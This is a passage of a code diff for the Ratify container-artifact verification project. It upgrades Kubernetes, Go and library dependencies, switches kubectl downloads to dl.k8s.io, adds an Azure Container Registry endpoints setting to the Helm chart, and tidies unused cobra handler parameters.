buildx build -f httpserver/Dockerfile --platform linux/amd64 --build-arg build_sbom=true --build-arg build_licensechecker=true --build-arg build_schemavalidator=true --build-arg build_vulnerabilityreport=true -t ${REGISTRY}/ratify-project/ratify:yourtag .\n+docker build --progress=plain --build-arg KUBE_VERSION=\"1.30.6\" --build-arg TARGETOS=\"linux\" --build-arg TARGETARCH=\"amd64\" -f crd.Dockerfile -t ${REGISTRY}/localbuildcrd:yourtag ./charts/ratify/crds\n ```\n \n #### [Authenticate](https://docs.docker.com/engine/reference/commandline/login/#usage) with your registry,  and push the newly built image\n```\n\nFilename: Makefile:\n```\n@@ -25,10 +25,10 @@\nLDFLAGS += -X $(GO_PKG)/internal/version.GitCommitHash=$(GIT_COMMIT_HASH)\n LDFLAGS += -X $(GO_PKG)/internal/version.GitTreeState=$(GIT_TREE_STATE)\n LDFLAGS += -X $(GO_PKG)/internal/version.GitTag=$(GIT_TAG)\n \n-KIND_VERSION ?= 0.22.0\n-KUBERNETES_VERSION ?= 1.29.2\n-KIND_KUBERNETES_VERSION ?= 1.29.2\n-GATEKEEPER_VERSION ?= 3.15.0\n+KIND_VERSION ?= 0.25.0\n+KUBERNETES_VERSION ?= 1.30.6\n+KIND_KUBERNETES_VERSION ?= 1.30.6\n+GATEKEEPER_VERSION ?= 3.17.0\n DAPR_VERSION ?= 1.12.5\n COSIGN_VERSION ?= 2.2.3\n NOTATION_VERSION ?= 1.1.0\n\n@@ -199,7 +199,7 @@\ne2e-dependencies:\n \t# Download and install kind\n \tcurl -L https://github.com/kubernetes-sigs/kind/releases/download/v${KIND_VERSION}/kind-linux-amd64 --output ${GITHUB_WORKSPACE}/bin/kind && chmod +x ${GITHUB_WORKSPACE}/bin/kind\n \t# Download and install kubectl\n-\tcurl -L https://storage.googleapis.com/kubernetes-release/release/v${KUBERNETES_VERSION}/bin/linux/amd64/kubectl --output ${GITHUB_WORKSPACE}/bin/kubectl && chmod +x ${GITHUB_WORKSPACE}/bin/kubectl\n+\tcurl -L https://dl.k8s.io/release/v${KUBERNETES_VERSION}/bin/linux/amd64/kubectl --output ${GITHUB_WORKSPACE}/bin/kubectl && chmod +x ${GITHUB_WORKSPACE}/bin/kubectl\n \t# Download and install bats\n \tcurl -sSLO https://github.com/bats-core/bats-core/archive/v${BATS_VERSION}.tar.gz && tar -zxvf v${BATS_VERSION}.tar.gz && bash bats-core-${BATS_VERSION}/install.sh ${GITHUB_WORKSPACE}\n \t# Download and install jq\n\n@@ -267,6 +267,7 @@\ne2e-helmfile-install:\n \tcd .staging/helmfilebin && tar -xvf helmfilebin.tar.gz\n     \n e2e-docker-credential-store-setup:\n+\tsudo apt-get install pass\n \trm -rf .staging/pass\n \tmkdir -p .staging/pass\n \tcd .staging/pass && git clone https://github.com/docker/docker-credential-helpers.git\n```\n\nFilename: charts/ratify/README.md:\n```\n@@ -78,6 +78,7 @@\nValues marked `# DEPRECATED` in the `values.yaml` as well as **DEPRECATED** in t\n | oras.authProviders.azureWorkloadIdentityEnabled    | Enables Azure Workload Identity authentication provider                                                                                                                                                                                                                                                                                                                | `false`                           |\n | oras.authProviders.azureManagedIdentityEnabled     | Enables Azure Managed Identity authentication provider                                                                                                                                                                                                                                                                                                                 | `false`                           |\n | oras.authProviders.k8secretsEnabled                | Enables kubernetes secrets authentication provider for registry interactions                                                                                                                                                                                                                                                                                           | `false`                           |\n+| oras.authProviders.azureContainerRegistryEndpoints | List of Azure Container Registry endpoints that the configured store can access. Endpoint is either a fully qualified domain name or a wildcard domain name following [RFC 1034](https://www.ietf.org/rfc/rfc1034.txt)                                                                                                                                                 | `[]`                              |\n | oras.authProviders.awsEcrBasicEnabled              | Enables AWS ECR basic authentication provider                                                                                                                                                                                                                                                                                                                          | `false`                           |\n | oras.authProviders.awsApiOverride.enabled          | Enables API URL overrides                                                                                                                                                                                                                                                                                                                                              | `false`                           |\n | oras.authProviders.awsApiOverride.endpoint         | Overrides ECR endpoint                                                                                                                                                                                                                                                                                                                                                 | ``                                |\n```\n\nFilename: charts/ratify/templates/store.yaml:\n```\n@@ -19,11 +19,15 @@\nspec:\n     authProvider:\n       name: azureWorkloadIdentity\n       clientID: {{ .Values.azureWorkloadIdentity.clientId }}\n+      endpoints:\n+        {{- toYaml .Values.oras.authProviders.azureContainerRegistryEndpoints | nindent 8 }}\n     {{- end }}\n     {{- if .Values.oras.authProviders.azureManagedIdentityEnabled }}\n     authProvider:\n       name: azureManagedIdentity\n       clientID: {{ .Values.azureManagedIdentity.clientId }}\n+      endpoints: \n+        {{- toYaml .Values.oras.authProviders.azureContainerRegistryEndpoints | nindent 8 }}\n     {{- end }}\n     {{- if .Values.oras.authProviders.k8secretsEnabled }}\n     authProvider:\n```\n\nFilename: charts/ratify/values.yaml:\n```\n@@ -70,6 +70,7 @@\noras:\n   authProviders:\n     azureWorkloadIdentityEnabled: false\n     azureManagedIdentityEnabled: false\n+    azureContainerRegistryEndpoints: []\n     k8secretsEnabled: false\n     awsEcrBasicEnabled: false\n     awsApiOverride:\n```\n\nFilename: cmd/ratify/cmd/discover.go:\n```\n@@ -60,7 +60,7 @@\nfunc NewCmdDiscover(argv ...string) *cobra.Command {\n \t\tShort:   \"Discover referrers for a subject\",\n \t\tExample: eg,\n \t\tArgs:    cobra.NoArgs,\n-\t\tRunE: func(cmd *cobra.Command, args []string) error {\n+\t\tRunE: func(_ *cobra.Command, _ []string) error {\n \t\t\treturn discover(opts)\n \t\t},\n \t}\n```\n\nFilename: cmd/ratify/cmd/referrer.go:\n```\n@@ -46,7 +46,7 @@\nfunc NewCmdReferrer(argv ...string) *cobra.Command {\n \t\tUse:   referrerUse,\n \t\tShort: \"Discover referrers for a subject\",\n \t\tArgs:  cobra.NoArgs,\n-\t\tRunE: func(cmd *cobra.Command, args []string) error {\n+\t\tRunE: func(cmd *cobra.Command, _ []string) error {\n \t\t\treturn cmd.Usage()\n \t\t},\n \t}\n\n@@ -71,7 +71,7 @@\nfunc NewCmdShowBlob(argv ...string) *cobra.Command {\n \t\tShort:   \"show blob at a digest\",\n \t\tExample: eg,\n \t\tArgs:    cobra.NoArgs,\n-\t\tRunE: func(cmd *cobra.Command, args []string) error {\n+\t\tRunE: func(_ *cobra.Command, _ []string) error {\n \t\t\treturn showBlob(opts)\n \t\t},\n \t}\n\n@@ -100,7 +100,7 @@\nfunc NewCmdShowRefManifest(argv ...string) *cobra.Command {\n \t\tShort:   \"show rference manifest at a digest\",\n \t\tExample: eg,\n \t\tArgs:    cobra.NoArgs,\n-\t\tRunE: func(cmd *cobra.Command, args []string) error {\n+\t\tRunE: func(_ *cobra.Command, _ []string) error {\n \t\t\treturn showRefManifest(opts)\n \t\t},\n \t}\n```\n\nFilename: cmd/ratify/cmd/resolve.go:\n```\n@@ -54,7 +54,7 @@\nfunc NewCmdResolve(argv ...string) *cobra.Command {\n \t\tShort:   \"Resolve digest of a subject that is referenced by a tag\",\n \t\tExample: eg,\n \t\tArgs:    cobra.NoArgs,\n-\t\tRunE: func(cmd *cobra.Command, args []string) error {\n+\t\tRunE: func(_ *cobra.Command, _ []string) error {\n \t\t\treturn resolve(opts)\n \t\t},\n \t}\n```\n\nFilename: cmd/ratify/cmd/root.go:\n```\n@@ -35,14 +35,14 @@\nfunc New(use, short string) *cobra.Command {\n \troot := &cobra.Command{\n \t\tUse:   use,\n \t\tShort: short,\n-\t\tPersistentPreRun: func(cmd *cobra.Command, args []string) {\n+\t\tPersistentPreRun: func(_ *cobra.Command, _ []string) {\n \t\t\tif enableDebug {\n \t\t\t\tcommon.SetLoggingLevel(\"debug\", logrus.StandardLogger())\n \t\t\t} else {\n \t\t\t\tcommon.SetLoggingLevelFromEnv(logrus.StandardLogger())\n \t\t\t}\n \t\t},\n-\t\tRunE: func(cmd *cobra.Command, args []string) error {\n+\t\tRunE: func(cmd *cobra.Command, _ []string) error {\n \t\t\treturn cmd.Usage()\n \t\t},\n \t\tSilenceUsage:      true,\n```\n\nFilename: cmd/ratify/cmd/serve.go:\n```\n@@ -58,7 +58,7 @@\nfunc NewCmdServe(_ ...string) *cobra.Command {\n \t\tShort:   \"Run ratify as a server\",\n \t\tExample: \"ratify server\",\n \t\tArgs:    cobra.NoArgs,\n-\t\tRunE: func(cmd *cobra.Command, args []string) error {\n+\t\tRunE: func(_ *cobra.Command, _ []string) error {\n \t\t\treturn serve(opts)\n \t\t},\n \t}\n\n@@ -118,7 +118,7 @@\nfunc serve(opts serveCmdOptions) error {\n \t\tif err != nil {\n \t\t\treturn err\n \t\t}\n-\t\tlogrus.Infof(\"starting server at\" + opts.httpServerAddress)\n+\t\tlogrus.Infof(\"starting server at: %s\", opts.httpServerAddress)\n \t\tif err := server.Run(nil); err != nil {\n \t\t\treturn err\n \t\t}\n```\n\nFilename: cmd/ratify/cmd/verify.go:\n```\n@@ -51,7 +51,7 @@\nfunc NewCmdVerify(_ ...string) *cobra.Command {\n \t\tShort:   \"Verify a subject\",\n \t\tExample: \"sample example\",\n \t\tArgs:    cobra.NoArgs,\n-\t\tRunE: func(cmd *cobra.Command, args []string) error {\n+\t\tRunE: func(_ *cobra.Command, _ []string) error {\n \t\t\treturn verify(opts)\n \t\t},\n \t}\n```\n\nFilename: cmd/ratify/cmd/version.go:\n```\n@@ -35,7 +35,7 @@\nratify version`\n \t\tShort:   \"Show the ratify version information\",\n \t\tExample: eg,\n \t\tArgs:    cobra.NoArgs,\n-\t\tRunE: func(cmd *cobra.Command, args []string) error {\n+\t\tRunE: func(_ *cobra.Command, _ []string) error {\n \t\t\treturn runVersion()\n \t\t},\n \t}\n```\n\nFilename: crd.Dockerfile:\n```\n@@ -20,7 +20,7 @@\nARG KUBE_VERSION\n RUN echo \"Ratify crd building on $TARGETOS, building for $TARGETARCH\"\n \n RUN apk add --no-cache curl && \\\n-    curl -LO https://storage.googleapis.com/kubernetes-release/release/v${KUBE_VERSION}/bin/${TARGETOS}/${TARGETARCH}/kubectl && \\\n+    curl -LO https://dl.k8s.io/release/v${KUBE_VERSION}/bin/${TARGETOS}/${TARGETARCH}/kubectl && \\\n     chmod +x kubectl\n \n FROM scratch as build\n```\n\nFilename: go.mod:\n```\n@@ -1,6 +1,6 @@\nmodule github.com/deislabs/ratify\n \n-go 1.21\n+go 1.23.3\n \n // Accidentally published prior to 1.0.0 release\n retract (\n\n@@ -17,38 +17,38 @@\nrequire (\n \tgithub.com/aws/aws-sdk-go-v2/config v1.27.23\n \tgithub.com/aws/aws-sdk-go-v2/credentials v1.17.23\n \tgithub.com/aws/aws-sdk-go-v2/service/ecr v1.28.6\n-\tgithub.com/cespare/xxhash/v2 v2.2.0\n+\tgithub.com/cespare/xxhash/v2 v2.3.0\n \tgithub.com/dapr/go-sdk v1.8.0\n \tgithub.com/dgraph-io/ristretto v0.1.1\n \tgithub.com/distribution/reference v0.5.0\n-\tgithub.com/docker/cli v26.1.5+incompatible\n+\tgithub.com/docker/cli v27.1.2+incompatible\n \tgithub.com/docker/distribution v2.8.3+incompatible\n \tgithub.com/fsnotify/fsnotify v1.7.0\n \tgithub.com/go-jose/go-jose/v3 v3.0.3\n \tgithub.com/golang/protobuf v1.5.4\n-\tgithub.com/google/go-containerregistry v0.19.1\n+\tgithub.com/google/go-containerregistry v0.19.2\n \tgithub.com/gorilla/mux v1.8.1\n \tgithub.com/notaryproject/notation-core-go v1.0.2\n \tgithub.com/notaryproject/notation-go v1.0.1\n \tgithub.com/open-policy-agent/cert-controller v0.8.0\n \tgithub.com/open-policy-agent/frameworks/constraint v0.0.0-20230411224310-3f237e2710fa\n-\tgithub.com/open-policy-agent/opa v0.63.0\n+\tgithub.com/open-policy-agent/opa v0.68.0\n \tgithub.com/opencontainers/go-digest v1.0.0\n \tgithub.com/opencontainers/image-spec v1.1.0\n \tgithub.com/owenrumney/go-sarif/v2 v2.3.1\n \tgithub.com/pkg/errors v0.9.1\n \tgithub.com/sigstore/cosign/v2 v2.2.4\n-\tgithub.com/sigstore/sigstore v1.8.3\n+\tgithub.com/sigstore/sigstore v1.8.6\n \tgithub.com/sirupsen/logrus v1.9.3\n \tgithub.com/spdx/tools-golang v0.5.4\n \tgithub.com/spf13/cobra v1.8.1\n \tgithub.com/xlab/treeprint v1.1.0\n-\tgo.opentelemetry.io/otel/exporters/prometheus v0.39.0\n-\tgo.opentelemetry.io/otel/metric v1.24.0\n-\tgo.opentelemetry.io/otel/sdk/metric v0.39.0\n-\tgolang.org/x/sync v0.7.0\n-\tgoogle.golang.org/grpc v1.62.2\n-\tgoogle.golang.org/protobuf v1.33.0\n+\tgo.opentelemetry.io/otel/exporters/prometheus v0.49.0\n+\tgo.opentelemetry.io/otel/metric v1.28.0\n+\tgo.opentelemetry.io/otel/sdk/metric v1.27.0\n+\tgolang.org/x/sync v0.10.0\n+\tgoogle.golang.org/grpc v1.66.0\n+\tgoogle.golang.org/protobuf v1.34.2\n \tk8s.io/api v0.28.11\n \tk8s.io/apimachinery v0.28.11\n \tk8s.io/client-go v0.28.11\n\n@@ -122,8 +122,7 @@\nrequire (\n \tgithub.com/xanzy/go-gitlab v0.102.0 // indirect\n \tgithub.com/yashtewari/glob-intersection v0.2.0 // indirect\n \tgo.step.sm/crypto v0.44.2 // indirect\n-\tgoogle.golang.org/genproto/googleapis/rpc v0.0.0-20240318140521-94a12d6c2237 // indirect\n-\tgopkg.in/go-jose/go-jose.v2 v2.6.3 // indirect\n+\tgoogle.golang.org/genproto/googleapis/rpc v0.0.0-20240701130421-f6361c86f094 // indirect\n \tgotest.tools/v3 v3.1.0 // indirect\n \tsigs.k8s.io/release-utils v0.7.7 // indirect\n )\n\n@@ -157,7 +156,7 @@\nrequire (\n \tgithub.com/dustin/go-humanize v1.0.1 // indirect\n \tgithub.com/fxamacker/cbor/v2 v2.5.0 // indirect\n \tgithub.com/go-chi/chi v4.1.2+incompatible // indirect\n-\tgithub.com/go-logr/logr v1.4.1\n+\tgithub.com/go-logr/logr v1.4.2\n \tgithub.com/go-logr/stdr v1.2.2 // indirect\n \tgithub.com/go-openapi/analysis v0.23.0 // indirect\n \tgithub.com/go-openapi/errors v0.22.0 // indirect\n\n@@ -170,8 +169,8 @@\nrequire (\n \tgithub.com/go-openapi/swag v0.23.0 // indirect\n \tgithub.com/go-openapi/validate v0.24.0 // indirect\n \tgithub.com/gogo/protobuf v1.3.2 // indirect\n-\tgithub.com/golang-jwt/jwt/v4 v4.5.0 // indirect\n-\tgithub.com/golang/glog v1.2.0 // indirect\n+\tgithub.com/golang-jwt/jwt/v4 v4.5.1 // indirect\n+\tgithub.com/golang/glog v1.2.1 // indirect\n \tgithub.com/golang/groupcache v0.0.0-20210331224755-41bb18bfe9da // indirect\n \tgithub.com/golang/snappy v0.0.4 // indirect\n \tgithub.com/google/certificate-transparency-go v1.1.8 // indirect\n\n@@ -186,9 +185,9 @@\nrequire (\n \tgithub.com/jmespath/go-jmespath v0.4.0 // indirect\n \tgithub.com/josharian/intern v1.0.0 // indirect\n \tgithub.com/json-iterator/go v1.1.12 // indirect\n-\tgithub.com/klauspost/compress v1.17.4 // indirect\n+\tgithub.com/klauspost/compress v1.17.9 // indirect\n \tgithub.com/kylelemons/godebug v1.1.0 // indirect\n-\tgithub.com/letsencrypt/boulder v0.0.0-20231026200631-000cd05d5491 // indirect\n+\tgithub.com/letsencrypt/boulder v0.0.0-20240620165639-de9c06129bec // indirect\n \tgithub.com/magiconair/properties v1.8.7 // indirect\n \tgithub.com/mailru/easyjson v0.7.7 // indirect\n \tgithub.com/mitchellh/go-homedir v1.1.0 // indirect\n\n@@ -201,10 +200,10 @@\nrequire (\n \tgithub.com/pelletier/go-toml/v2 v2.1.0 // indirect\n \tgithub.com/pkg/browser v0.0.0-20240102092130-5ac0b6a4141c // indirect\n \tgithub.com/pmezard/go-difflib v1.0.1-0.20181226105442-5d4384ee4fb2 // indirect\n-\tgithub.com/prometheus/client_golang v1.19.0\n-\tgithub.com/prometheus/client_model v0.6.0 // indirect\n-\tgithub.com/prometheus/common v0.51.1 // indirect\n-\tgithub.com/prometheus/procfs v0.12.0 // indirect\n+\tgithub.com/prometheus/client_golang v1.20.2\n+\tgithub.com/prometheus/client_model v0.6.1 // indirect\n+\tgithub.com/prometheus/common v0.55.0 // indirect\n+\tgithub.com/prometheus/procfs v0.15.1 // indirect\n \tgithub.com/rcrowley/go-metrics v0.0.0-20201227073835-cf1acfcdf475 // indirect\n \tgithub.com/sassoftware/relic v7.2.1+incompatible // indirect\n \tgithub.com/secure-systems-lab/go-securesystemslib v0.8.0 // indirect\n\n@@ -227,21 +226,21 @@\nrequire (\n \tgithub.com/xeipuuv/gojsonreference v0.0.0-20180127040603-bd5ef7bd5415 // indirect\n \tgithub.com/xeipuuv/gojsonschema v1.2.0\n \tgo.mongodb.org/mongo-driver v1.14.0 // indirect\n-\tgo.opentelemetry.io/otel v1.24.0\n-\tgo.opentelemetry.io/otel/sdk v1.24.0\n-\tgo.opentelemetry.io/otel/trace v1.24.0 // indirect\n+\tgo.opentelemetry.io/otel v1.28.0\n+\tgo.opentelemetry.io/otel/sdk v1.28.0\n+\tgo.opentelemetry.io/otel/trace v1.28.0 // indirect\n \tgo.uber.org/atomic v1.11.0 // indirect\n \tgo.uber.org/multierr v1.11.0 // indirect\n \tgo.uber.org/zap v1.27.0 // indirect\n-\tgolang.org/x/crypto v0.24.0\n-\tgolang.org/x/exp v0.0.0-20231108232855-2478ac86f678 // indirect\n+\tgolang.org/x/crypto v0.32.0\n+\tgolang.org/x/exp v0.0.0-20240112132812-db7319d0e0e3 // indirect\n \tgolang.org/x/mod v0.17.0 // indirect\n-\tgolang.org/x/net v0.26.0 // indirect\n-\tgolang.org/x/oauth2 v0.20.0 // indirect\n-\tgolang.org/x/sys v0.21.0 // indirect\n-\tgolang.org/x/term v0.21.0 // indirect\n-\tgolang.org/x/text v0.16.0 // indirect\n-\tgolang.org/x/time v0.5.0 // indirect\n+\tgolang.org/x/net v0.34.0 // indirect\n+\tgolang.org/x/oauth2 v0.21.0 // indirect\n+\tgolang.org/x/sys v0.29.0 // indirect\n+\tgolang.org/x/term v0.28.0 // indirect\n+\tgolang.org/x/text v0.21.0 // indirect\n+\tgolang.org/x/time v0.6.0 // indirect\n \tgomodules.xyz/jsonpatch/v2 v2.3.0 // indirect\n \tgopkg.in/inf.v0 v0.9.1 // indirect\n \tgopkg.in/ini.v1 v1.67.0 // indirect\n\n@@ -257,8 +256,3 @@\nrequire (\n \tsigs.k8s.io/structured-merge-diff/v4 v4.3.0 // indirect\n \tsigs.k8s.io/yaml v1.4.0 // indirect\n )\n-\n-replace (\n-\tgithub.com/prometheus/client_golang => github.com/prometheus/client_golang v1.12.2\n-\tk8s.io/apiserver => k8s.io/apiserver v0.22.5\n-)\n```\n\nFilename: go.sum:\n```\n@@ -1,47 +1,15 @@\ncloud.google.com/go v0.26.0/go.mod h1:aQUYkXzVsufM+DwF1aE+0xfcU+56JwCaLick0ClmMTw=\n-cloud.google.com/go v0.34.0/go.mod h1:aQUYkXzVsufM+DwF1aE+0xfcU+56JwCaLick0ClmMTw=\n-cloud.google.com/go v0.38.0/go.mod h1:990N+gfupTy94rShfmMCWGDn0LpTmnzTp2qbd1dvSRU=\n-cloud.google.com/go v0.44.1/go.mod h1:iSa0KzasP4Uvy3f1mN/7PiObzGgflwredwwASm/v6AU=\n-cloud.google.com/go v0.44.2/go.mod h1:60680Gw3Yr4ikxnPRS/oxxkBccT6SA1yMk63TGekxKY=\n-cloud.google.com/go v0.45.1/go.mod h1:RpBamKRgapWJb87xiFSdk4g1CME7QZg3uwTez+TSTjc=\n-cloud.google.com/go v0.46.3/go.mod h1:a6bKKbmY7er1mI7TEI4lsAkts/mkhTSZK8w33B4RAg0=\n-cloud.google.com/go v0.50.0/go.mod h1:r9sluTvynVuxRIOHXQEHMFffphuXHOMZMycpNR5e6To=\n-cloud.google.com/go v0.52.0/go.mod h1:pXajvRH/6o3+F9jDHZWQ5PbGhn+o8w9qiu/CffaVdO4=\n-cloud.google.com/go v0.53.0/go.mod h1:fp/UouUEsRkN6ryDKNW/Upv/JBKnv6WDthjR6+vze6M=\n-cloud.google.com/go v0.54.0/go.mod h1:1rq2OEkV3YMf6n/9ZvGWI3GWw0VoqH/1x2nd8Is/bPc=\n-cloud.google.com/go v0.56.0/go.mod h1:jr7tqZxxKOVYizybht9+26Z/gUq7tiRzu+ACVAMbKVk=\n-cloud.google.com/go v0.57.0/go.mod h1:oXiQ6Rzq3RAkkY7N6t3TcE6jE+CIBBbA36lwQ1JyzZs=\n-cloud.google.com/go v0.62.0/go.mod h1:jmCYTdRCQuc1PHIIJ/maLInMho30T/Y0M4hTdTShOYc=\n-cloud.google.com/go v0.65.0/go.mod h1:O5N8zS7uWy9vkA9vayVHs65eM1ubvY4h553ofrNHObY=\n cloud.google.com/go v0.112.1 h1:uJSeirPke5UNZHIb4SxfZklVSiWWVqW4oXlETwZziwM=\n-cloud.google.com/go/bigquery v1.0.1/go.mod h1:i/xbL2UlR5RvWAURpBYZTtm/cXjCha9lbfbpx4poX+o=\n-cloud.google.com/go/bigquery v1.3.0/go.mod h1:PjpwJnslEMmckchkHFfq+HTD2DmtT67aNFKH1/VBDHE=\n-cloud.google.com/go/bigquery v1.4.0/go.mod h1:S8dzgnTigyfTmLBfrtrhyYhwRxG72rYxvftPBK2Dvzc=\n-cloud.google.com/go/bigquery v1.5.0/go.mod h1:snEHRnqQbz117VIFhE8bmtwIDY80NLUZUMb4Nv6dBIg=\n-cloud.google.com/go/bigquery v1.7.0/go.mod h1://okPTzCYNXSlb24MZs83e2Do+h+VXtc4gLoIoXIAPc=\n-cloud.google.com/go/bigquery v1.8.0/go.mod h1:J5hqkt3O0uAFnINi6JXValWIb1v0goeZM77hZzJN/fQ=\n cloud.google.com/go/compute/metadata v0.3.0 h1:Tz+eQXMEqDIKRsmY3cHTL6FVaynIjX2QxYC4trgAKZc=\n cloud.google.com/go/compute/metadata v0.3.0/go.mod h1:zFmK7XCadkQkj6TtorcaGlCW1hT1fIilQDwofLpJ20k=\n-cloud.google.com/go/datastore v1.0.0/go.mod h1:LXYbyblFSglQ5pkeyhO+Qmw7ukd3C+pD7TKLgZqpHYE=\n-cloud.google.com/go/datastore v1.1.0/go.mod h1:umbIZjpQpHh4hmRpGhH4tLFup+FVzqBi1b3c64qFpCk=\n cloud.google.com/go/iam v1.1.6 h1:bEa06k05IO4f4uJonbB5iAgKTPpABy1ayxaIZV/GHVc=\n cloud.google.com/go/iam v1.1.6/go.mod h1:O0zxdPeGBoFdWW3HWmBxJsk0pfvNM/p/qa82rWOGTwI=\n cloud.google.com/go/kms v1.15.8 h1:szIeDCowID8th2i8XE4uRev5PMxQFqW+JjwYxL9h6xs=\n cloud.google.com/go/kms v1.15.8/go.mod h1:WoUHcDjD9pluCg7pNds131awnH429QGvRM3N/4MyoVs=\n-cloud.google.com/go/pubsub v1.0.1/go.mod h1:R0Gpsv3s54REJCy4fxDixWD93lHJMoZTyQ2kNxGRt3I=\n-cloud.google.com/go/pubsub v1.1.0/go.mod h1:EwwdRX2sKPjnvnqCa270oGRyludottCI76h+R3AArQw=\n-cloud.google.com/go/pubsub v1.2.0/go.mod h1:jhfEVHT8odbXTkndysNHCcx0awwzvfOlguIAii9o8iA=\n-cloud.google.com/go/pubsub v1.3.1/go.mod h1:i+ucay31+CNRpDW4Lu78I4xXG+O1r/MAHgjpRVR+TSU=\n-cloud.google.com/go/storage v1.0.0/go.mod h1:IhtSnM/ZTZV8YYJWCY8RULGVqBDmpoyjwiyrjsg+URw=\n-cloud.google.com/go/storage v1.5.0/go.mod h1:tpKbwo567HUNpVclU5sGELwQWBDZ8gh0ZeosJ0Rtdos=\n-cloud.google.com/go/storage v1.6.0/go.mod h1:N7U0C8pVQ/+NIKOBQyamJIeKQKkZ+mxpohlUTyfDhBk=\n-cloud.google.com/go/storage v1.8.0/go.mod h1:Wv1Oy7z6Yz3DshWRJFhqM/UCfaWIRTdp0RXyy7KQOVs=\n-cloud.google.com/go/storage v1.10.0/go.mod h1:FLPqc6j+Ki4BU591ie1oL6qBQGu2Bl/tZ9ullr3+Kg0=\n cuelabs.dev/go/oci/ociregistry v0.0.0-20240314152124-224736b49f2e h1:GwCVItFUPxwdsEYnlUcJ6PJxOjTeFFCKOh6QWg4oAzQ=\n cuelabs.dev/go/oci/ociregistry v0.0.0-20240314152124-224736b49f2e/go.mod h1:ApHceQLLwcOkCEXM1+DyCXTHEJhNGDpJ2kmV6axsx24=\n cuelang.org/go v0.8.1 h1:VFYsxIFSPY5KgSaH1jQ2GxHOrbu6Ga3kEI70yCZwnOg=\n cuelang.org/go v0.8.1/go.mod h1:CoDbYolfMms4BhWUlhD+t5ORnihR7wvjcfgyO9lL5FI=\n-dmitri.shuralyov.com/gpu/mtl v0.0.0-20190408044501-666a987793e9/go.mod h1:H6x//7gZCb22OMCxBHrMx7a5I7Hp++hsVxbQ4BYO7hU=\n filippo.io/edwards25519 v1.1.0 h1:FNf4tywRC1HmFuKW5xopWpigGjJKiJSV0Cqo0cJWDaA=\n filippo.io/edwards25519 v1.1.0/go.mod h1:BxyFTGdWcka3PhytdK4V28tE5sGfRvvvRV7EaN4VDT4=\n github.com/AdamKorcz/go-fuzz-headers-1 v0.0.0-20230919221257-8b5d3ce2d11d h1:zjqpY4C7H15HjRPEenkS4SAn3Jy2eRRjkjZbGR30TOg=\n\n@@ -92,7 +60,6 @@\ngithub.com/Azure/go-ntlmssp v0.0.0-20221128193559-754e69321358/go.mod h1:chxPXzS\n github.com/AzureAD/microsoft-authentication-library-for-go v1.2.2 h1:XHOnouVk1mxXfQidrMEnLlPk9UMeRtyBTnEFtxkV0kU=\n github.com/AzureAD/microsoft-authentication-library-for-go v1.2.2/go.mod h1:wP83P5OoQ5p6ip3ScPr0BAq0BvuPAvacpEuSzyouqAI=\n github.com/BurntSushi/toml v0.3.1/go.mod h1:xHWCNGjB5oqiDr8zfno3MHue2Ht5sIBksp03qcyfWMU=\n-github.com/BurntSushi/xgb v0.0.0-20160522181843-27f122750802/go.mod h1:IVnqGOEym/WlBOVXweHU+Q+/VP0lqqI8lqeDx9IjBqo=\n github.com/Microsoft/go-winio v0.6.1 h1:9/kr64B9VUZrLm5YYwbGtUJnMgqWVOdUAXu6Migciow=\n github.com/Microsoft/go-winio v0.6.1/go.mod h1:LRdKpFKfdobln8UmuiYcKPot9D2v6svN5+sAH+4kjUM=\n github.com/OneOfOne/xxhash v1.2.8 h1:31czK/TI9sNkxIKfaUfGlU47BAxQ0ztGgd9vPyqimf8=\n\n@@ -209,15 +176,14 @@\ngithub.com/bytecodealliance/wasmtime-go/v3 v3.0.2 h1:3uZCA/BLTIu+DqCfguByNMJa2HV\n github.com/bytecodealliance/wasmtime-go/v3 v3.0.2/go.mod h1:RnUjnIXxEJcL6BgCvNyzCCRzZcxCgsZCi+RNlvYor5Q=\n github.com/cenkalti/backoff/v3 v3.2.2 h1:cfUAAO3yvKMYKPrvhDuHSwQnhZNk/RMHKdZqKTxfm6M=\n github.com/cenkalti/backoff/v3 v3.2.2/go.mod h1:cIeZDE3IrqwwJl6VUwCN6trj1oXrTS4rc0ij+ULvLYs=\n-github.com/cenkalti/backoff/v4 v4.2.1 h1:y4OZtCnogmCPw98Zjyt5a6+QwPLGkiQsYW5oUqylYbM=\n-github.com/cenkalti/backoff/v4 v4.2.1/go.mod h1:Y3VNntkOUPxTVeUxJ/G5vcM//AlwfmyYozVcomhLiZE=\n+github.com/cenkalti/backoff/v4 v4.3.0 h1:MyRJ/UdXutAwSAT+s3wNd7MfTIcy71VQueUuFK343L8=\n+github.com/cenkalti/backoff/v4 v4.3.0/go.mod h1:Y3VNntkOUPxTVeUxJ/G5vcM//AlwfmyYozVcomhLiZE=\n github.com/census-instrumentation/opencensus-proto v0.2.1/go.mod h1:f6KPmirojxKA12rnyqOA5BBL4O983OfeGPqjHWSTneU=\n github.com/cespare/xxhash v1.1.0 h1:a6HrQnmkObjyL+Gs60czilIUGqrzKutQD6XZog3p+ko=\n github.com/cespare/xxhash v1.1.0/go.mod h1:XrSqR1VqqWfGrhpAt58auRo0WTKS1nRRg3ghfAqPWnc=\n github.com/cespare/xxhash/v2 v2.1.1/go.mod h1:VGX0DQ3Q6kWi7AoAeZDth3/j3BFtOZR5XLFGgcrjCOs=\n-github.com/cespare/xxhash/v2 v2.1.2/go.mod h1:VGX0DQ3Q6kWi7AoAeZDth3/j3BFtOZR5XLFGgcrjCOs=\n-github.com/cespare/xxhash/v2 v2.2.0 h1:DC2CZ1Ep5Y4k3ZQ899DldepgrayRUGE6BBZ/cd9Cj44=\n-github.com/cespare/xxhash/v2 v2.2.0/go.mod h1:VGX0DQ3Q6kWi7AoAeZDth3/j3BFtOZR5XLFGgcrjCOs=\n+github.com/cespare/xxhash/v2 v2.3.0 h1:UL815xU9SqsFlibzuggzjXhog7bL6oX9BbNZnL2UFvs=\n+github.com/cespare/xxhash/v2 v2.3.0/go.mod h1:VGX0DQ3Q6kWi7AoAeZDth3/j3BFtOZR5XLFGgcrjCOs=\n github.com/chrismellard/docker-credential-acr-env v0.0.0-20230304212654-82a0ddb27589 h1:krfRl01rzPzxSxyLyrChD+U+MzsBXbm0OwYYB67uF+4=\n github.com/chrismellard/docker-credential-acr-env v0.0.0-20230304212654-82a0ddb27589/go.mod h1:OuDyvmLnMCwa2ep4Jkm6nyA0ocJuZlGyk2gGseVzERM=\n github.com/chzyer/logex v1.1.10/go.mod h1:+Ywpsq7O8HXn0nuIou7OrIPyXbp3wmkHB+jjWRnGsAI=\n\n@@ -272,12 +238,10 @@\ngithub.com/dimchansky/utfbom v1.1.1 